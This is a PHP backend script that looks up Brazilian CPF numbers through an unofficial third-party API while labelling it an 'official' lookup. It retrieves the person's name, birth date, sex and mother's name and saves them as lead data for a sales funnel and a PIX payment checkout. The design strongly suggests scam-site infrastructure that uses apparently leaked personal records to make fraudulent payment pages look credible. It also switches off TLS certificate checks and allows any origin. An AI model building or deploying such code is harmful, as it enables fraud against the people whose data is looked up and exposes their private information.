<?php
/**
 * Consulta de CPF Oficial via Backend PHP
 * Integração: https://site-clientes.online/aknes-api/aknes.php?cpf={{cpf}}
 * 
 * Sem expor credenciais ou endpoints externos no frontend.
 * Salva os dados na sessão PHP para utilização no checkout e geração de PIX.
 */

// Permite CORS e requisições OPTIONS pré-voo
if (!headers_sent()) {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
}

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Iniciar sessão se ainda não iniciada
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// Obter CPF da requisição (GET, POST ou JSON)
$rawCpf = $_GET['cpf'] ?? $_POST['cpf'] ?? null;
if (!$rawCpf) {
    $input = json_decode(file_get_contents('php://input'), true);
    if (is_array($input) && !empty($input['cpf'])) {
        $rawCpf = $input['cpf'];
    }
}

if (!$rawCpf) {
    http_response_code(400);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status' => 400,
        'error' => 'CPF não informado.'
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}

// Limpar caracteres não numéricos
$cpf = preg_replace('/\D/', '', (string)$rawCpf);

if (strlen($cpf) !== 11) {
    http_response_code(400);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status' => 400,
        'error' => 'Formato de CPF inválido. O CPF deve conter 11 dígitos numéricos.'
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}

// Endpoint oficial fornecido pelo usuário - consultado exclusivamente pelo backend PHP
$apiUrl = "https://site-clientes.online/aknes-api/aknes.php?cpf=" . urlencode($cpf);

$response = false;
$httpCode = 0;

// Consulta HTTPS com cURL
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 12);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 6);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

// Fallback via file_get_contents caso cURL falhe
if ($response === false || empty($response) || $httpCode >= 400) {
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 12,
            'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: application/json\r\n"
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    $response = @file_get_contents($apiUrl, false, $ctx);
}

// Tratar falha na consulta externa
if ($response === false || empty($response)) {
    http_response_code(502);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status' => 502,
        'error' => 'Falha de comunicação com a API de CPF externa.'
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}

// Decodificar dados para validação e salvar na sessão
$data = json_decode($response, true);
if (is_array($data)) {
    $statusCode = isset($data['status']) ? (int)$data['status'] : 200;
    $data['status'] = $statusCode;
    
    // Normalizar propriedades para compatibilidade total entre páginas
    $data['REF'] = ($statusCode === 200) ? 1 : 0;
    $data['NOME'] = $data['nome'] ?? '';
    $rawMae = trim((string)($data['mae'] ?? ''));
    $finalMae = (!empty($rawMae) && stripos($rawMae, 'EXEMPLO') === false) ? $rawMae : 'INDISPONIVEL';
    $data['MAE'] = $finalMae;
    $data['mae'] = $finalMae;
    $data['NASCIMENTO'] = $data['nascimento'] ?? '';
    $data['SEXO'] = $data['sexo'] ?? '';
    $data['CPF'] = $data['cpf'] ?? $cpf;
    if (empty($data['naturalidade'])) {
        $data['naturalidade'] = 'BRASIL';
    }

    if ($statusCode === 200) {
        // Salvar na sessão PHP para o funil e checkout PIX Pepper
        $_SESSION['lead_data'] = [
            'cpf' => $data['cpf'] ?? $cpf,
            'nome' => $data['nome'] ?? '',
            'nascimento' => $data['nascimento'] ?? '',
            'sexo' => $data['sexo'] ?? '',
            'mae' => $finalMae,
            'naturalidade' => $data['naturalidade']
        ];
        $_SESSION['lead_cpf'] = $cpf;
        if (!empty($data['nome'])) {
            $_SESSION['lead_nome'] = $data['nome'];
        }
    }

    $response = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
}

// Resposta JSON final
if (!headers_sent()) {
    header('Content-Type: application/json; charset=utf-8');
}
echo $response;
